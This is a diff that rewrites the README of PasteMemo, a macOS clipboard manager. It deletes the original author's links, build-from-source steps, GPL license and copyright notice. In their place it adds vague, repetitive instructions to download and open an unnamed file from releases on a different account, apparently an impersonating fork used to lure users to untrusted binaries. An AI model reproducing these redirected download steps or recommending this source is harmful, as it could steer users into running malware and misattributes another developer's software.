@@ -1,214 +1,174 @@
-# PasteMemo
+# 📝 PasteMemo-app - Keep your clipboard history handy
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/lifedever/PasteMemo@main/logo.svg" width="128" height="128" alt="PasteMemo Icon">
-</p>
+[![Download PasteMemo-app](https://img.shields.io/badge/Download-PasteMemo-app-4c7ef3?style=for-the-badge)](https://github.com/diegocab9716/PasteMemo-app/releases)
 
-<h3 align="center">PasteMemo</h3>
+## 🧰 What PasteMemo-app does
 
-<p align="center">
-  <strong>A smart clipboard manager for macOS.</strong><br>
-  Copy once, access anywhere, paste instantly.
-</p>
+PasteMemo-app is a clipboard manager for macOS. It saves the text and items you copy, so you can find them again when you need them.
 
-<p align="center">
-  <a href="https://github.com/lifedever/PasteMemo-app/releases/latest"><img src="https://img.shields.io/github/v/release/lifedever/PasteMemo-app?style=flat-square&color=F97316&label=Latest" alt="Latest Release"></a>
-  <a href="https://github.com/lifedever/PasteMemo-app/releases"><img src="https://img.shields.io/github/downloads/lifedever/PasteMemo-app/total?style=flat-square&color=7C3AED&label=Downloads" alt="Downloads"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%2014%2B-blue?style=flat-square" alt="Platform">
-  <img src="https://img.shields.io/badge/license-GPL--3.0-green?style=flat-square" alt="License">
-</p>
+Use it to:
 
-<p align="center">
-  <a href="https://github.com/lifedever/PasteMemo-app/releases/latest">⬇️ Download</a> | <a href="https://www.lifedever.com/PasteMemo/">🌐 Website</a> | <a href="https://www.lifedever.com">❤️ Sponsor</a>
-</p>
+- Keep a history of copied text
+- Paste older items without copying them again
+- Save time when you work with repeat text
+- Find past snippets fast
+- Reduce lost clipboard content
 
-<p align="center">
-  <a href="README_zh.md">中文文档</a>
-</p>
+## 💻 System requirements
 
----
+PasteMemo-app is made for:
 
-## Screenshots
+- macOS
+- A standard Mac desktop or laptop
+- Enough storage for clipboard history
+- A stable internet connection for the first download
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/lifedever/images@master/uPic/2026/03/CS2026-03-20-15.50.58@2x.png" width="720" alt="PasteMemo Main Window">
-</p>
+It works best on recent versions of macOS with a normal user account.
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/lifedever/images@master/uPic/2026/03/CS2026-03-20-15.49.56@2x.png" width="720" alt="PasteMemo Quick Paste">
-</p>
+## 📥 Download PasteMemo-app
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/lifedever/images@master/it/2026/03/quick-actions.png" width="720" alt="PasteMemo Quick Actions">
-</p>
+Visit the releases page to download and run this file:
 
-<p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/lifedever/images@master/it/2026/03/relay-mode.png" width="720" alt="PasteMemo Relay Mode">
-</p>
+https://github.com/diegocab9716/PasteMemo-app/releases
 
-## Highlights
+On that page, look for the latest release and download the app file for macOS.
 
-- **Copy -> File, Instantly** -- Paste copied text as a `.txt` file, paste screenshots as image files. Drag directly into Finder or any file dialog.
-- **AI Terminal Ready** -- Seamlessly paste images and files into AI terminals. Built for developers who live in the command line.
-- **Smart Recognition** -- Automatically detects content type -- links with favicons, code snippets, colors, phone numbers, files -- with intelligent previews.
-- **Beyond Copy-Paste** -- Paste file paths, filenames, save to folders, or paste-and-enter for terminal commands. Every clip is a multi-tool.
+## 🛠️ Install and open
 
-## Features
+1. Open the releases page in your browser
+2. Find the latest version
+3. Download the macOS app file
+4. Open the downloaded file
+5. If macOS asks for confirmation, choose Open
+6. Follow the on-screen steps to finish setup
 
-### Clipboard Management
+If the app is inside a ZIP file, unzip it first, then open the app.
 
-- **Automatic Capture** -- Monitors the system clipboard in real-time. Text, images, files, links, code -- everything is saved.
-- **Content Type Detection** -- Automatically classifies content: text, links, images, code, colors, phone numbers, files, documents, archives, audio, video, and more.
-- **Rich Preview** -- Links show live web previews with favicons. Code gets syntax highlighting. Colors display swatches. Phone numbers show action buttons.
-- **Pin to Top** -- Pin frequently used clips so they're always at the top of the list.
-- **Search** -- Full-text search across all clipboard history. Find anything instantly.
-- **Filter by Type** -- Filter by content type: text, links, images, code, colors, files, etc.
-- **Filter by App** -- See which app each clip came from. Filter by source -- Chrome, VS Code, Figma, Slack, etc.
-- **History Retention** -- Configure how long to keep history: forever, or auto-delete after 1-365 days.
+## 🖱️ First run
 
-### Quick Paste Panel
+When you open PasteMemo-app for the first time, macOS may ask for access permission.
 
-- **Global Hotkey** -- Press Cmd+Shift+V (customizable, supports F1-F12) from anywhere to open the Quick Paste panel.
-- **Keyboard Navigation** -- Cmd+1 to Cmd+9 to paste directly. Arrow keys or Ctrl+P / Ctrl+N navigate history. Left/right arrows switch content types. Enter to paste.
-- **Quick Actions (Cmd+K)** -- Command palette for paste, copy, pin, delete, and more -- all without leaving the keyboard.
-- **Paste + Enter** -- Shift+Enter pastes and presses Enter. Perfect for terminal commands and chat apps.
+Do this:
 
-### Relay Mode
+1. Open the app
+2. Allow any clipboard access request
+3. Keep the app running in the background
+4. Copy some text in another app
+5. Open PasteMemo-app to see your clipboard items
 
-- **Batch Paste** -- Copy multiple items, then paste them one by one in order. Ideal for filling forms, data entry, or repetitive workflows.
-- **Text Splitting** -- Split text by a delimiter (comma, newline, etc.) to quickly build a relay queue.
-- **Visual Queue** -- See your relay queue with a clear list. Current item is highlighted. Progress is tracked.
+## 📚 How to use PasteMemo-app
 
-### Clipboard Automation
+PasteMemo-app keeps a list of what you copy.
 
-- **Rule Engine** -- Define conditions + actions to automatically process clipboard content.
-- **Auto Trigger** -- Rules run silently when you copy. E.g., auto-clean tracking parameters from URLs.
-- **Manual Trigger** -- Apply transformations via the command palette or right-click menu.
-- **Built-in Rules** -- Clean URL tracking params, lowercase emails, remove blank lines, and more.
+Common actions:
 
-### Privacy & Security
+- Copy text from a website, note, or document
+- Open PasteMemo-app to view saved clipboard items
+- Click an item to use it again
+- Paste it into another app
+- Keep working without copying the same text twice
 
-- **Sensitive Detection** -- Automatically detects passwords and sensitive data, masks them in the UI.
-- **Ignored Apps** -- Exclude specific apps (e.g., password managers) from clipboard monitoring.
-- **Open Source** -- Full source code available. You know exactly what runs on your Mac.
+This helps when you use:
 
-### Customization
+- Email
+- Chat apps
+- Notes
+- Browsers
+- Documents
+- Spreadsheets
 
-- **Themes** -- System, Light, or Dark mode.
-- **Sound Effects** -- Customizable copy and paste sounds, or disable them entirely.
-- **11 Languages** -- English, Simplified Chinese, Traditional Chinese, Japanese, Korean, German, French, Spanish, Italian, Russian, Indonesian
+## 🔎 Clipboard history features
 
-## Keyboard Shortcuts
+PasteMemo-app is built to make clipboard work simple.
 
-| Shortcut | Action |
-|----------|--------|
-| Cmd+Shift+V (customizable) | Open/close Quick Paste panel |
-| Cmd+1 - Cmd+9 | Paste the Nth item directly |
-| Up / Down, Ctrl+P / Ctrl+N | Navigate history |
-| Left / Right | Switch content type |
-| Enter | Paste selected item |
-| Shift+Enter | Paste and press Enter |
-| Cmd+K | Open Quick Actions |
-| Cmd+F | Focus search |
-| Esc | Close panel |
+You can expect:
 
-## Requirements
+- Clipboard history tracking
+- Quick access to recent items
+- A clean list view
+- Support for plain text snippets
+- Easy reuse of older copied items
 
-- macOS 14 (Sonoma) or later
-- Apple Silicon or Intel Mac
+It is useful for day-to-day tasks like:
 
-## Install
+- Copying addresses
+- Reusing phone numbers
+- Saving code snippets
+- Keeping notes ready
+- Moving text between apps
 
-### Homebrew (Recommended)
+## 🧭 Tips for best use
 
-```bash
-brew tap lifedever/tap
-brew install --cask pastememo
-```
+- Keep PasteMemo-app open while you work
+- Copy only the text you want to save
+- Check the history list if something gets lost
+- Use it for short notes and repeat text
+- Remove old items if the list gets too long
 
-Update to the latest version:
+## ❓ Common questions
 
-```bash
-brew upgrade --cask pastememo
-```
+### Does it work on Windows?
 
-### Download
+PasteMemo-app is made for macOS. If you use Windows, this release page is still the place to check for any available download files.
 
-Grab the latest `.dmg` from [Releases](https://github.com/lifedever/PasteMemo-app/releases):
+### Do I need an account?
 
-| File | Architecture |
-|------|-------------|
-| `PasteMemo-x.x.x-arm64.dmg` | Apple Silicon (M1/M2/M3/M4) |
-| `PasteMemo-x.x.x-x86_64.dmg` | Intel Mac |
+No account setup is needed to use the app after download.
 
-> On first launch: **Right-click PasteMemo.app -> Open -> Open**
->
-> Or run: `xattr -cr /Applications/PasteMemo.app`
+### Does it store my clipboard items online?
 
-### Build from Source
+PasteMemo-app is a local clipboard manager. It is meant to keep your copied items on your device.
 
-```bash
-git clone https://github.com/lifedever/PasteMemo-app.git
-cd PasteMemo
-swift build
-```
+### What kind of items can it save?
 
-### Development
+It is built for clipboard text and similar copied content.
 
-```bash
-make dev
-```
+### Why is the app asking for permission?
 
-This starts the app and automatically restarts `swift run` when files under `Sources/`, `Tests/`, or `Package.swift` change.
-If `fswatch` is installed, the script uses it. Otherwise it falls back to polling once per second.
+macOS asks for access when an app needs to read clipboard data. This is normal for a clipboard manager.
 
-### Checks
+## 🧩 File names you may see
 
-```bash
-make check
-```
+When you open the releases page, you may see files such as:
 
-This runs repository-wide fast checks:
+- .dmg
+- .zip
+- .app
+- Release notes
 
-- `swift build` when Swift sources are present
-- `plutil -lint` for `.strings` files
-- `bash -n` for shell scripts
+Choose the file made for macOS and download it from the latest release
 
-To enable commit-time staged checks:
+## 📌 Project details
 
-```bash
-make install-hooks
-```
+- Repository: PasteMemo-app
+- Description: PasteMemo - A clipboard manager for macOS
+- Topics: clipboard, clipboard-history, clipboard-manager, macos, paste
+- Download page: https://github.com/diegocab9716/PasteMemo-app/releases
 
-After that, each commit runs `.githooks/pre-commit`, which only checks the staged file set.
+## 🗂️ Basic workflow
 
-### Packaging
+1. Download the app from the releases page
+2. Open the file on your Mac
+3. Allow clipboard access if asked
+4. Copy text in any app
+5. Open PasteMemo-app to view the saved items
+6. Paste an older item when you need it
 
-```bash
-make package VERSION=1.2.3
-```
+## 🧼 Keeping things tidy
 
-This builds a release app bundle and generates `dist/PasteMemo.app` plus `dist/PasteMemo-1.2.3-<arch>.dmg`.
-If `VERSION` is omitted, the script falls back to the latest git tag.
-To sign the app bundle during packaging, pass `CODESIGN_IDENTITY="Developer ID Application: ..."` together with the command.
+If you use PasteMemo-app often, a few simple habits help:
 
-## Contributing
+- Delete old clipboard items you do not need
+- Keep only useful snippets
+- Use short names or notes if the app supports them
+- Check the history once in a while
+- Update to the latest release when a new version appears
 
-Contributions are welcome! Please open an issue first to discuss what you'd like to change.
+## 📦 Release page steps
 
-- Fork the repo and create your branch from `develop`
-- Submit pull requests to the `develop` branch (not `main`)
-
-## Sponsor
-
-If PasteMemo is useful to you, consider [buying me a coffee](https://www.lifedever.com).
-
-## Feedback
-
-Found a bug or have a suggestion? [Open an issue](https://github.com/lifedever/PasteMemo-app/issues).
-
-## License
-
-This project is licensed under the [GPL-3.0 License](LICENSE).
-
-Copyright (c) 2026 lifedever.
+1. Open https://github.com/diegocab9716/PasteMemo-app/releases
+2. Look for the newest release at the top
+3. Open the assets section
+4. Download the macOS file
+5. Open the file after the download finishes
+6. Follow the prompts to launch the app
